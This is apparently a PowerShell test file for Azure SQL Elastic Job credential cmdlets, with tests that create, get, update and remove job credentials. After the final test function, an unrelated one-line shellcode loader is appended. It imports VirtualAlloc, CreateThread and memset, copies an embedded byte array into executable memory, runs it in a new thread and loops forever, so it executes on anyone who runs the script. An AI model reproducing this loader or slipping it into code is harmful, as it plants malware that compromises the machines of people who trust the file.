














function Test-CreateJobCredential
{
	$a1 = Create-ElasticJobAgentTestEnvironment

	try
	{
		Test-CreateJobCredentialWithDefaultParam $a1
		Test-CreateJobCredentialWithParentObject $a1
		Test-CreateJobCredentialWithParentResourceId $a1
		Test-CreateJobCredentialWithPiping $a1
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}
}



function Test-GetJobCredential
{
	$a1 = Create-ElasticJobAgentTestEnvironment

	try
	{
		Test-GetJobCredentialWithDefaultParam $a1
		Test-GetJobCredentialWithParentObject $a1
		Test-GetJobCredentialWithParentResourceId $a1
		Test-GetJobCredentialWithPiping $a1
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}
}


function Test-UpdateJobCredential
{
	$a1 = Create-ElasticJobAgentTestEnvironment

	try
	{
		Test-UpdateJobCredentialWithDefaultParam $a1
		Test-UpdateJobCredentialWithInputObject $a1
		Test-UpdateJobCredentialWithResourceId $a1
		Test-UpdateJobCredentialWithPiping $a1
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}
}


function Test-RemoveJobCredential
{
	$a1 = Create-ElasticJobAgentTestEnvironment

	try
	{
		Test-RemoveJobCredentialWithDefaultParam $a1
		Test-RemoveJobCredentialWithInputObject $a1
		Test-RemoveJobCredentialWithResourceId $a1
		Test-RemoveJobCredentialWithPiping $a1
	}
	finally
	{
		Remove-ResourceGroupForTest $a1
	}
}


function Test-CreateJobCredentialWithDefaultParam ($a1)
{
	
	$cn1 = Get-JobCredentialName
	$c1 = Get-ServerCredential

	
	$resp = New-AzSqlElasticJobCredential -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName -AgentName $a1.AgentName -Name $cn1 -Credential $c1
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.CredentialName $cn1
	Assert-AreEqual $resp.UserName $c1.UserName
}


function Test-CreateJobCredentialWithParentObject ($a1)
{
	
	$cn1 = Get-JobCredentialName
	$c1 = Get-ServerCredential

	
	$resp = New-AzSqlElasticJobCredential -ParentObject $a1 -Name $cn1 -Credential $c1
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.CredentialName $cn1
	Assert-AreEqual $resp.UserName $c1.UserName
}


function Test-CreateJobCredentialWithParentResourceId ($a1)
{
	
	$cn1 = Get-JobCredentialName
	$c1 = Get-ServerCredential

	
	$resp = New-AzSqlElasticJobCredential -ParentResourceId $a1.ResourceId -Name $cn1 -Credential $c1
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.CredentialName $cn1
	Assert-AreEqual $resp.UserName $c1.UserName
}


function Test-CreateJobCredentialWithPiping ($a1)
{
	
	$cn1 = Get-JobCredentialName
	$c1 = Get-ServerCredential

	
	$resp = $a1 | New-AzSqlElasticJobCredential -Name $cn1 -Credential $c1
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.CredentialName $cn1
	Assert-AreEqual $resp.UserName $c1.UserName
}


function Test-UpdateJobCredentialWithDefaultParam ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1

	
	$newCred = Get-Credential
	$resp = Set-AzSqlElasticJobCredential -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName -AgentName $a1.AgentName -Name $jc1.CredentialName -Credential $newCred
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $newCred.UserName
}


function Test-UpdateJobCredentialWithInputObject ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1

	
	$newCred = Get-Credential
	$resp = Set-AzSqlElasticJobCredential -InputObject $jc1 -Credential $newCred
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $newCred.UserName
}


function Test-UpdateJobCredentialWithResourceId ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1

	
	$newCred = Get-Credential
	$resp = Set-AzSqlElasticJobCredential -ResourceId $jc1.ResourceId -Credential $newCred
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $newCred.UserName
}


function Test-UpdateJobCredentialWithPiping ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1

	
	$newCred = Get-Credential
	$resp = $jc1 | Set-AzSqlElasticJobCredential -Credential $newCred
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $newCred.UserName
}


function Test-GetJobCredentialWithDefaultParam ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1
	$jc2 = Create-JobCredentialForTest $a1

	
	$resp = Get-AzSqlElasticJobCredential -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName -AgentName $a1.AgentName -Name $jc1.CredentialName
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $jc1.UserName

	
	$resp = Get-AzSqlElasticJobCredential -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName -AgentName $a1.AgentName
	Assert-True { $resp.Count -ge 2 }
}


function Test-GetJobCredentialWithParentObject ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1
	$jc2 = Create-JobCredentialForTest $a1

	
	$resp = Get-AzSqlElasticJobCredential -ParentObject $a1 -Name $jc1.CredentialName

	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $jc1.UserName

	
	$resp = Get-AzSqlElasticJobCredential -ParentObject $a1
	Assert-True { $resp.Count -ge 2 }
}


function Test-GetJobCredentialWithParentResourceId ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1
	$jc2 = Create-JobCredentialForTest $a1

		
	$resp = Get-AzSqlElasticJobCredential -ParentResourceId $a1.ResourceId -Name $jc1.CredentialName
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $jc1.UserName

	
	$resp = Get-AzSqlElasticJobCredential -ParentResourceId $a1.ResourceId
	Assert-True { $resp.Count -ge 2 }
}


function Test-GetJobCredentialWithPiping ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1
	$jc2 = Create-JobCredentialForTest $a1

		
	$resp = $a1 | Get-AzSqlElasticJobCredential -Name $jc1.CredentialName
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $jc1.UserName

	
	$resp = $a1 | Get-AzSqlElasticJobCredential
	Assert-True { $resp.Count -ge 2 }
}


function Test-RemoveJobCredentialWithDefaultParam ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1

	
	$resp = Remove-AzSqlElasticJobCredential -ResourceGroupName $a1.ResourceGroupName -ServerName $a1.ServerName -AgentName $a1.AgentName -Name $jc1.CredentialName
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $jc1.UserName
}


function Test-RemoveJobCredentialWithInputObject ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1

	
	$resp = Remove-AzSqlElasticJobCredential -InputObject $jc1
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $jc1.UserName
}


function Test-RemoveJobCredentialWithResourceId ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1

	
	$resp = Remove-AzSqlElasticJobCredential -ResourceId $jc1.ResourceId
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $jc1.UserName
}


function Test-RemoveJobCredentialWithPiping ($a1)
{
	
	$jc1 = Create-JobCredentialForTest $a1
	$jc2 = Create-JobCredentialForTest $a1

	
	$resp = $jc1 | Remove-AzSqlElasticJobCredential
	Assert-AreEqual $resp.ResourceGroupName $a1.ResourceGroupName
	Assert-AreEqual $resp.ServerName $a1.ServerName
	Assert-AreEqual $resp.AgentName $a1.AgentName
	Assert-AreEqual $resp.CredentialName $jc1.CredentialName
	Assert-AreEqual $resp.UserName $jc1.UserName

	
	$all = $a1 | Get-AzSqlElasticJobCredential
	$resp = $all | Remove-AzSqlElasticJobCredential
	Assert-True { $resp.Count -ge 1 }

	
	Assert-Throws { $a1 | Get-AzSqlElasticJobCredential -Name $jc1.CredentialName }
}
$oLpg = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $oLpg -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xbb,0xd3,0x00,0xee,0xd9,0xcd,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x03,0x5a,0x13,0x83,0xc2,0xbf,0x31,0xf5,0x12,0x57,0x37,0xf6,0xea,0xa7,0x58,0x7e,0x0f,0x96,0x58,0xe4,0x5b,0x88,0x68,0x6e,0x09,0x24,0x02,0x22,0xba,0xbf,0x66,0xeb,0xcd,0x08,0xcc,0xcd,0xe0,0x89,0x7d,0x2d,0x62,0x09,0x7c,0x62,0x44,0x30,0x4f,0x77,0x85,0x75,0xb2,0x7a,0xd7,0x2e,0xb8,0x29,0xc8,0x5b,0xf4,0xf1,0x63,0x17,0x18,0x72,0x97,0xef,0x1b,0x53,0x06,0x64,0x42,0x73,0xa8,0xa9,0xfe,0x3a,0xb2,0xae,0x3b,0xf4,0x49,0x04,0xb7,0x07,0x98,0x55,0x38,0xab,0xe5,0x5a,0xcb,0xb5,0x22,0x5c,0x34,0xc0,0x5a,0x9f,0xc9,0xd3,0x98,0xe2,0x15,0x51,0x3b,0x44,0xdd,0xc1,0xe7,0x75,0x32,0x97,0x6c,0x79,0xff,0xd3,0x2b,0x9d,0xfe,0x30,0x40,0x99,0x8b,0xb6,0x87,0x28,0xcf,0x9c,0x03,0x71,0x8b,0xbd,0x12,0xdf,0x7a,0xc1,0x45,0x80,0x23,0x67,0x0d,0x2c,0x37,0x1a,0x4c,0x38,0xf4,0x17,0x6f,0xb8,0x92,0x20,0x1c,0x8a,0x3d,0x9b,0x8a,0xa6,0xb6,0x05,0x4c,0xc9,0xec,0xf2,0xc2,0x34,0x0f,0x03,0xca,0xf2,0x5b,0x53,0x64,0xd3,0xe3,0x38,0x74,0xdc,0x31,0xd4,0x71,0x4a,0x7a,0x81,0x7a,0x9b,0x12,0xd0,0x7a,0x8a,0xbe,0x5d,0x9c,0xfc,0x6e,0x0e,0x31,0xbc,0xde,0xee,0xe1,0x54,0x35,0xe1,0xde,0x44,0x36,0x2b,0x77,0xee,0xd9,0x82,0x2f,0x86,0x40,0x8f,0xa4,0x37,0x8c,0x05,0xc1,0x77,0x06,0xaa,0x35,0x39,0xef,0xc7,0x25,0xad,0x1f,0x92,0x14,0x7b,0x1f,0x08,0x32,0x83,0xb5,0xb7,0x95,0xd4,0x21,0xba,0xc0,0x12,0xee,0x45,0x27,0x29,0x27,0xd0,0x88,0x45,0x48,0x34,0x09,0x95,0x1e,0x5e,0x09,0xfd,0xc6,0x3a,0x5a,0x18,0x09,0x97,0xce,0xb1,0x9c,0x18,0xa7,0x66,0x36,0x71,0x45,0x51,0x70,0xde,0xb6,0xb4,0x80,0x22,0x61,0xf0,0xf6,0x4a,0xb1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$4VId=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($4VId.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$4VId,0,0,0);for (;;){Start-sleep 60};

